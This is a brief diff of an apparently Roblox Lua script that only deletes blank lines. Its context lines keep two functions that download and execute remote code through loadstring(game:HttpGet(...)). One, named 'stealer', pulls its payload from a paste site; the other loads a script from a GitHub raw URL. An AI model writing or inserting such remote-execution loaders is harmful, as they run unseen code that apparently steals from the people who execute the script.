@@ -1,9 +1,7 @@
 local function stealer()
-
 loadstring(game:HttpGet("https://paste.debian.net/plainh/591ac0a7/", true))()
 end
 local function loadui()
-
 loadstring(game:HttpGet(“https://raw.githubusercontent.com/Zenscripts915/LOADING-SCRIPT/refs/heads/main/Script”))()
 end
 
